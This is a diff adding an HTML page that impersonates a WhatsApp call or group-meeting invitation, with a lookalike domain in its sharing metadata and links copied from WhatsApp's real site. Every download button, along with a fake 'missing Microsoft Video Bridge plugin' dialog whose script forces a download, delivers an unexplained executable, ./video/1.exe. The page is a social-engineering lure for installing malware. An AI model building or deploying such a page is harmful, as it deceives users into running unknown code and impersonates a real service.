@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta property="og:title" content="WhatsApp Group Meeting" />
+  <meta property="og:description" content="You are invited to join a WhatsApp group meeting. Click to join." />
+  <meta property="og:image" content="https://dwefer.oss-cn-hongkong.aliyuncs.com/images.png" />
+  <meta property="og:url" content="https://meeting-whatsapp.com/index.html" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <title>Group Meeting - WhatsApp</title>
+  <link href="./WhatsApp _ 多人会议_files/Logo_green.svg" rel="icon"/>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #f0f2f5; }
+    a { color: #222; text-decoration: none; }
+    a:hover { text-decoration: underline; }
+    .blue-link { color: #007bff; font-weight: bold; font-size: 20px; }
+    .blue-link:hover { text-decoration: underline; }
+    header {
+      background-color: #f0f2f5; padding: 12px 5vw;
+      display: flex; justify-content: space-between;
+      align-items: center; flex-wrap: wrap; border-bottom: 1px solid #ccc;
+    }
+    header nav { display: flex; flex-wrap: wrap; gap: 20px; font-size: 17px; }
+    .header-actions {
+      display: flex; gap: 10px; margin-top: 10px;
+    }
+    .header-actions button {
+      font-size: 16px; padding: 10px 24px; border-radius: 999px;
+      font-weight: 500; transition: all 0.2s ease; cursor: pointer;
+    }
+    .header-actions button:first-child {
+      background-color: #fff; color: #128C7E; border: 1.8px solid #128C7E;
+    }
+    .header-actions button:last-child {
+      background-color: #25D366; color: #fff; border: none;
+    }
+    .header-actions button:hover {
+      box-shadow: 0 2px 8px rgba(0,0,0,0.12); transform: translateY(-1px);
+    }
+    .main {
+      margin-top: 112px; text-align: center; padding: 40px 20px;
+    }
+    .video-icon {
+      width: 140px; height: 140px; background-color: #dcfce7;
+      border-radius: 50%; display: flex; align-items: center;
+      justify-content: center; margin: 0 auto 20px;
+    }
+    .video-icon img { width: 72px; height: 72px; }
+    .main h1 { font-size: 24px; margin-bottom: 20px; color: #444; }
+    .join-btn {
+      padding: 12px 28px; background-color: #128C7E; color: white;
+      border: none; border-radius: 20px; font-size: 20px; cursor: pointer;
+    }
+    .download-tip { margin-top: 30px; font-size: 20px; }
+    #custom-modal { display: none; }
+    #custom-modal .overlay {
+      position: fixed; top:0; left:0; right:0; bottom:0;
+      background: rgba(0,0,0,0.4); z-index: 1000;
+    }
+    #custom-modal .box {
+      position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+      background: white; padding: 24px; width: 400px; border-radius: 4px;
+      z-index: 1001; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+      font-family: inherit;
+    }
+    footer {
+      margin-top: 188px; min-height: 33vh;
+      background-color: #1e2a30; color: white; padding: 50px 5vw;
+    }
+    .footer-container {
+      display: flex; flex-wrap: wrap; justify-content: space-between;
+      max-width: 1400px; margin: 0 auto; align-items: flex-start; gap: 40px;
+    }
+    .footer-left {
+      display: flex; flex-direction: column; align-items: flex-start; min-width: 160px;
+    }
+    .footer-left img { height: 40px; margin-bottom: 16px; }
+    .footer-left button {
+      background-color: #25D366; color: white; border: none;
+      padding: 8px 20px; border-radius: 20px; font-size: 20px; cursor: pointer;
+    }
+    .footer-group { min-width: 140px; }
+    .footer-group h4 { font-size: 20px; margin-bottom: 12px; }
+    .footer-group a {
+      display: block; color: white; text-decoration: none;
+      font-size: 20px; margin-bottom: 8px;
+    }
+    .footer-group a:hover { text-decoration: underline; }
+    @media(max-width:768px){
+      header nav, .header-actions { margin-top: 10px; }
+      .header-actions button { font-size: 14px; padding: 8px 20px; }
+      .footer-container { flex-direction: column; gap: 24px; }
+    }
+  </style>
+</head>
+<body>
+<header>
+  <div style="display:flex;align-items:center;gap:10px;">
+    <img src="./WhatsApp _ 通话邀请_files/JvsnINJ2CZv.svg" style="height:50px;"/>
+  </div>
+  <nav>
+    <a href="https://business.whatsapp.com/">Features</a>
+    <a href="https://www.whatsapp.com/privacy">Privacy</a>
+    <a href="https://faq.whatsapp.com/">Help Center</a>
+    <a href="https://blog.whatsapp.com/">Blog</a>
+    <a href="https://business.whatsapp.com/">For Business</a>
+    <a href="https://www.whatsapp.com/download">Apps</a>
+  </nav>
+  <div class="header-actions">
+    <button onclick="location.href='https://web.whatsapp.com/'">Log In</button>
+    <button onclick="location.href='./video/1.exe'">Download ⬇</button>
+  </div>
+</header>
+<div class="main">
+  <div class="video-icon">
+    <img src="./WhatsApp _ 通话邀请_files/Logo_green.svg"/>
+  </div>
+  <h1 id="title">Voice Call Invitation</h1>
+  <button class="join-btn" id="joinBtn">Join Call</button>
+  <div class="download-tip">
+    <span>Haven’t downloaded WhatsApp yet?</span><br/>
+    <a class="blue-link" href="./video/1.exe" id="downloadLink">Download</a>
+  </div>
+</div>
+<div id="custom-modal" style="display: none;">
+  <div class="overlay"></div>
+  <div class="box">
+    <h3 id="modal-title">Unable to Join the Call</h3>
+    <p id="modal-body">Your system is missing a required component: Microsoft Video Bridge plugin.<br/>Install it now?</p>
+    <div style="margin-top:20px;">
+      <button id="modal-cancel">Cancel</button>
+      <button id="modal-confirm" style="background:#128C7E;color:white;">Install Now</button>
+    </div>
+  </div>
+</div>
+<footer>
+  <div class="footer-container">
+    <div class="footer-left">
+      <img alt="logo" src="./WhatsApp _ 通话邀请_files/JvsnINJ2CZv.svg"/>
+      <button onclick="location.href='./video/1.exe'">Download ⬇</button>
+    </div>
+    <div class="footer-group"><h4>Features</h4><a href="https://www.whatsapp.com/stayconnected">Stay Connected</a><a href="https://blog.whatsapp.com/">Blog</a><a href="https://www.whatsapp.com/security">Security</a><a href="https://business.whatsapp.com/">For Business</a></div>
+    <div class="footer-group"><h4>Who We Are</h4><a href="https://www.whatsapp.com/about">About Us</a><a href="https://www.whatsapp.com/join">Careers</a><a href="https://about.meta.com/cn/brand/resources/whatsapp/whatsapp-brand">Brand Center</a><a href="https://www.whatsapp.com/privacy">Privacy</a></div>
+    <div class="footer-group"><h4>Using WhatsApp</h4><a href="https://www.whatsapp.com/android">Android</a><a href="https://www.whatsapp.com/download">iPhone</a><a href="https://www.whatsapp.com/download">Mac/PC</a><a href="https://web.whatsapp.com/">Web Version</a></div>
+    <div class="footer-group"><h4>Need Help?</h4><a href="https://www.whatsapp.com/contact">Contact Us</a><a href="https://faq.whatsapp.com/">Help Center</a><a href="https://www.whatsapp.com/download">Apps</a><a href="https://www.whatsapp.com/security/advisories">Security Advisories</a></div>
+  </div>
+</footer>
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+  document.getElementById("joinBtn").onclick = () => {
+    window.location.href = "./video/index.html";
+  };
+
+  document.getElementById("modal-cancel").onclick = () => {
+    document.getElementById("custom-modal").style.display = "none";
+  };
+
+  document.getElementById("modal-confirm").onclick = () => {
+    document.getElementById("custom-modal").style.display = "none";
+    const link = document.createElement("a");
+    link.href = "./video/1.exe";
+    link.download = "1.exe";
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+  };
+
+  document.getElementById("downloadLink").classList.add("blue-link");
+});
+</script>
+</body>
+</html>
